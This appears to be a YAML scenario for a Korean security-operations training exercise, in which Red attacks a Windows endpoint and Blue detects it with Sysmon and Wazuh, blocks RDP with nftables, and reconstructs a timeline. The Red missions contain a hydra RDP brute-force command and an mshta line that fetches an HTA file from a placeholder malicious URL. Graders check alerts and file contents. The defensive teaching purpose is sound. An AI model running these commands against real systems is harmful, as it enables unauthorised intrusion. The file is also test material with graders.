id: "secuops-w03"
category: "secuops"
title: "[보안운영 W3] 엔드포인트 침해(RDP·PowerShell·LOLBAS) vs Sysmon/EDR 탐지"
difficulty: "medium"
time_limit: 3000
battle_type: "1v1"
description: |
  보안운영 3주차 — 직원 PC(Windows 엔드포인트, el34-win)를 노린 공격을 **Sysmon + Wazuh(EDR)**
  로 탐지한다. 경계 장비(방화벽/IPS/WAF)가 막지 못한 엔드포인트 단계의 위협(RDP 무차별 대입,
  PowerShell 난독 실행, LOLBAS)을 호스트 가시화로 잡는 것이 핵심이다.

  ▸ 모드
    • solo : 공격자 → 엔드포인트 운영자(EDR 탐지·대응)를 한 학생이 수행. 대상=본인 인프라.
    • duel : Red 가 상대 엔드포인트를 공격, Blue 는 본인 EDR 로 탐지. 대상=상대 인프라.

  ▸ 공격자 위치(중요)
    이 주차의 Red 미션은 **망 외부 공격자 VM({{ATTACKER_IP}})** 기준이다. el34 는 공격자의 출처 IP를
    fw→ips→web(WAF) 전 계층에 그대로 보존하므로(HAProxy 제거·NAT 출처소실 없음), Red 채점은 **대상
    (el34) 인프라에 남은 탐지 흔적**(WAF audit / IPS / 호스트 계정·포트)과 **출처 IP({{ATTACKER_IP}})·
    고유 태그 상관**으로 한다. 반드시 **고유 태그**를 붙여 앰비언트 노이즈와 구분되게 한다.

# ───────────────────────── RED (엔드포인트 침해) ─────────────────────────
red_missions:
  - order: 1
    assess_target: opponent
    target_vm: siem
    points: 20
    instruction: |
      ## 🎯 RED-1 — [외부] RDP 무차별 대입 (엔드포인트 인증 공격)

      당신은 **망 외부 공격자(외부 공격자 VM {{ATTACKER_IP}})** 다. 경계 너머로 노출된 RDP 로 직원 PC 계정에 무차별
      대입을 시도한다. 다수의 로그온 실패는 Windows 보안 로그(EID 4625)에 남고, Wazuh 가 이를
      엔드포인트에서 수집한다.

      ### 권장 명령 (참고)
      ```bash
      hydra -l Administrator -P /usr/share/wordlists/small.txt rdp://{{WEB_ENTRY}} -t 2 -f
      # 또는 crowbar/ncrack 의 RDP 모듈
      ```
      ### 📌 채점
      외부 명령 미수집 → **대상 엔드포인트의 Windows 인증 실패 이벤트(EID 4625)가 Wazuh 로 올라온
      흔적** 으로 채점한다(외부 외부 공격자 VM({{ATTACKER_IP}}) 명령 로그 불신뢰).

      ### ✅ 합격 기준
      대상 SIEM(Wazuh)에 Windows 인증 실패(RDP/EID 4625) 관련 경보가 남는다.
    hint: "외부 공격자 VM({{ATTACKER_IP}}) 에서 RDP 무차별 대입. 채점: 대상 Wazuh 의 Windows 인증 실패(EID 4625)."
    verify:
      type: "wazuh_alert"
      expect: "authentication"
      checks:
        - { id: "red-1-1", type: "wazuh_alert", target: "siem",
            params: { groups: "authentication_failed", since_sec: 1800 } }
      semantic:
        intent: |
          MITRE T1110 (Brute Force) on RDP — 외부 공격자 모델. command_ran(외부 공격자 VM {{ATTACKER_IP}}) 불신뢰,
          대상 엔드포인트의 Windows Security EID 4625(로그온 실패)가 Wazuh 로 수집된 흔적으로 판정.
        success_criteria:
          - "대상 Wazuh 에 Windows 인증 실패/RDP 관련 경보(최근)"
          - "다수 실패가 짧은 시간에 몰림(무차별 대입)"
          - "(설명) 노린 계정과 RDP 노출 위험 서술"
        acceptable_methods: ["외부 공격자 VM({{ATTACKER_IP}}) 에서 hydra/ncrack/crowbar RDP 무차별 대입"]
        negative_signs: ["대상 엔드포인트 인증 실패 이벤트 없음", "command_ran(외부 공격자 VM {{ATTACKER_IP}}) 의존"]

  - order: 2
    assess_target: opponent
    target_vm: siem
    points: 20
    instruction: |
      ## 🎯 RED-2 — [내부 발판] PowerShell 난독 실행 / LOLBAS (침해 후 시뮬레이션)

      ⚠️ 이 미션은 **내부 발판(attacker, SSH 2202)** 을 사용한다 — 공격자가 경계를 이미 통과해
      엔드포인트에서 코드를 실행하는 *침해 후* 단계를 시뮬레이션한다(외부 공격이 아님을 명시).

      엔드포인트에서 ① PowerShell `-EncodedCommand`(base64 난독) 또는 ② LOLBAS(mshta+http URL)
      를 실행하면, Sysmon 이 프로세스 생성(EID 1)/네트워크(EID 3) 이벤트로 기록하고 Wazuh 가
      수집한다.

      ### 권장 형태 (참고)
      ```
      powershell -EncodedCommand <base64>      # 난독 명령 실행
      mshta http://<악성URL>/x.hta             # LOLBAS
      ```
      ### 📌 채점
      이 행위가 **엔드포인트 Sysmon 이벤트(EID 1/3)로 Wazuh 에 수집** 됐는지로 채점한다(내부 발판
      행위의 호스트 가시화). 외부/내부 공격자 구분을 채점에 혼동하지 않는다 — 신호는 엔드포인트→Wazuh.

      ### ✅ 합격 기준
      대상 SIEM(Wazuh)에 PowerShell 난독 실행 또는 LOLBAS 관련 Sysmon 경보가 남는다.
    hint: "내부 발판(attacker)에서 PowerShell -EncodedCommand/mshta. 채점: 대상 Wazuh 의 Sysmon EID 1/3 경보."
    verify:
      type: "wazuh_alert"
      expect: "sysmon"
      checks:
        - { id: "red-2-1", type: "wazuh_alert", target: "siem",
            params: { groups: "sysmon", since_sec: 1800 } }
      semantic:
        intent: |
          MITRE T1059.001 (PowerShell) / T1218 (LOLBAS) — 침해 후 엔드포인트 실행. 내부 발판
          명시. 채점은 엔드포인트 Sysmon(EID 1 프로세스 / EID 3 네트워크)이 Wazuh 로 수집된 흔적.
        success_criteria:
          - "대상 Wazuh 에 Sysmon 프로세스/네트워크 이벤트 경보(최근)"
          - "난독 PowerShell 또는 LOLBAS 패턴이 이벤트에 보임"
          - "(설명) 왜 base64/-EncodedCommand 가 의심스러운지 서술"
        acceptable_methods: ["내부 발판에서 powershell -EncodedCommand / mshta http"]
        negative_signs: ["엔드포인트 Sysmon 이벤트 없음", "외부/내부 구분을 잘못 적용"]

# ───────────────────────── BLUE (엔드포인트 EDR 운영: self) ─────────────────────────
blue_missions:
  - order: 1
    assess_target: self
    target_vm: siem
    points: 12
    instruction: |
      ## 🛡️ BLUE-1 — 엔드포인트가 EDR 감시망에 있는지 확인

      직원 PC(el34-win)가 Wazuh 에 에이전트로 등록·Active 이고 Sysmon 이 이벤트를 보내고 있는지
      확인한다(엔드포인트 탐지의 토대).

      ### ✅ 합격 기준
      본인 SIEM 에 Windows 엔드포인트(el34-win) 관련 이벤트/경보 수집 흔적이 있다.
    hint: "본인 Wazuh 에서 windows 엔드포인트(el34-win) 이벤트 수집 확인."
    verify:
      type: "wazuh_alert"
      expect: "windows"
      checks:
        - { id: "blue-1-1", type: "wazuh_alert", target: "siem",
            params: { groups: "windows", since_sec: 86400 } }
      semantic:
        intent: "EDR 가용성 — Windows 엔드포인트가 Wazuh 로 이벤트를 보냄(탐지 토대)."
        success_criteria: ["본인 Wazuh 에 windows 그룹 이벤트 수집", "(설명) Sysmon+Wazuh 가 무엇을 보는지 서술"]
        acceptable_methods: ["siem wazuh_alert(groups=windows)", "agent_control 로 el34-win Active"]
        negative_signs: ["windows 이벤트 수집 없음(에이전트 점검 필요)"]

  - order: 2
    assess_target: self
    target_vm: siem
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 — RDP 무차별 대입 탐지 (EID 4625)

      RED-1 의 RDP 무차별 대입을 본인 Wazuh 에서 Windows 인증 실패(EID 4625) 경보로 탐지한다.
      보고에 **구체값**(출발지, 노린 계정, 실패 횟수)을 명시한다.

      ### ✅ 합격 기준
      본인 SIEM 에 RDP/Windows 인증 실패 경보가 있고, 그 구체값을 정확히 식별했다.
    hint: "본인 Wazuh 에서 Windows 인증 실패(EID 4625) 경보 + 출발지/계정/횟수 식별."
    verify:
      type: "wazuh_alert"
      expect: "authentication"
      checks:
        - { id: "blue-2-1", type: "wazuh_alert", target: "siem",
            params: { groups: "authentication_failed", since_sec: 1800 } }
      semantic:
        intent: "MITRE D3FEND D3-UAA — 엔드포인트 인증 실패(EID 4625) 탐지. 관측/분석: 경보 실존 + 구체값 일치로 채점."
        success_criteria:
          - "본인 Wazuh 에 Windows 인증 실패 경보(최근)"
          - "출발지·노린 계정·실패 횟수 등 구체값 정확 식별(증거 일치)"
        acceptable_methods: ["siem wazuh_alert(authentication_failed)", "alerts.json 의 4625 분석"]
        negative_signs: ["구체값 없는 막연 보고", "구체값 불일치"]

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 — PowerShell 난독/LOLBAS 탐지 (Sysmon EID 1/3)

      RED-2 의 PowerShell 난독 실행/LOLBAS 를 본인 Wazuh 의 Sysmon 이벤트(EID 1 프로세스 생성,
      EID 3 네트워크)에서 탐지한다. 의심 커맨드라인(`-EncodedCommand`, mshta+http)을 식별한다.

      ### ✅ 합격 기준
      본인 SIEM 에 PowerShell/LOLBAS 관련 Sysmon 경보가 있고, 의심 커맨드라인을 식별했다.
    hint: "본인 Wazuh 의 Sysmon EID 1/3 에서 PowerShell -EncodedCommand/mshta 식별."
    verify:
      type: "wazuh_alert"
      expect: "sysmon"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem",
            params: { groups: "sysmon", since_sec: 1800 } }
      semantic:
        intent: "MITRE D3FEND D3-PSA — 프로세스 생성 분석. 관측/분석: Sysmon 이벤트 실존 + 의심 커맨드라인 구체 식별로 채점."
        success_criteria:
          - "본인 Wazuh 에 Sysmon 프로세스/네트워크 경보(최근)"
          - "의심 커맨드라인(-EncodedCommand/mshta/http) 구체 식별(증거 일치)"
        acceptable_methods: ["siem wazuh_alert(sysmon)", "Sysmon EID 1/3 분석"]
        negative_signs: ["구체값 없는 막연 보고", "정상 프로세스를 오탐"]

  - order: 4
    assess_target: self
    target_vm: fw
    points: 15
    instruction: |
      ## 🛡️ BLUE-4 — RDP 노출 차단 (경계에서 엔드포인트 보호)

      엔드포인트 RDP 가 외부에 노출되지 않도록 방화벽에서 외부발 RDP(3389)를 차단한다.
      `/etc/nftables.conf` 영속 반영 + `log prefix "RDP-BLOCK:"`. 다층 방어(경계+엔드포인트)를 실증.

      ### 권장 형태 (참고)
      ```
      nft add rule inet six_filter forward tcp dport 3389 ip saddr != 10.20.40.0/24 \
        log prefix "RDP-BLOCK: " drop
      ```
      ### 📌 채점: /etc/nftables.conf 에 RDP-BLOCK 표식 차단 룰.
      ### ✅ 합격: /etc/nftables.conf 에 외부 RDP 차단 룰이 있다.
    hint: "외부발 RDP(3389) drop + RDP-BLOCK prefix 를 /etc/nftables.conf 에 영속 반영."
    verify:
      type: "file_contains"
      expect: "RDP-BLOCK"
      checks:
        - { id: "blue-4-1", type: "file_contains", target: "fw",
            params: { path: "/etc/nftables.conf", pattern: "RDP-BLOCK" } }
      semantic:
        intent: "MITRE D3FEND D3-NTF — 엔드포인트 노출 면 축소(외부 RDP 차단). 경계+엔드포인트 다층 방어."
        success_criteria: ["nftables.conf 에 외부 RDP 차단", "RDP-BLOCK 표식", "(설명) 경계+엔드포인트 다층 방어 의미"]
        acceptable_methods: ["nft ... dport 3389 saddr != 관리망 drop 영속화"]
        negative_signs: ["RDP 전체 개방 유지", "영속화 누락"]

  - order: 5
    assess_target: self
    target_vm: siem
    points: 10
    instruction: |
      ## 🛡️ BLUE-5 — 엔드포인트 사건 타임라인 정리 (analyst 관점)

      RDP 대입 → 엔드포인트 실행으로 이어지는 사건을 Wazuh 이벤트로 시간순 정리한다(누가/언제/무엇).
      엔드포인트 경보가 SIEM 으로 모여 한 사건으로 재구성되는지 확인한다.

      ### ✅ 합격 기준
      본인 SIEM 에 엔드포인트 사건 경보가 수집돼 있고, 시간순 흐름을 요약했다.
    hint: "본인 Wazuh 의 엔드포인트 경보를 시간순 정리(RDP 대입→실행)."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "포렌식 타임라인 — 엔드포인트 사건을 Wazuh 근거로 시간순 재구성."
        success_criteria: ["본인 Wazuh 엔드포인트 경보(최근)", "(설명) RDP 대입→실행 시간순 흐름 요약"]
        acceptable_methods: ["siem wazuh_alert 시간순 정리", "중앙 SIEM 탭"]
        negative_signs: ["수집 비어있음", "시간순 정리 없음"]
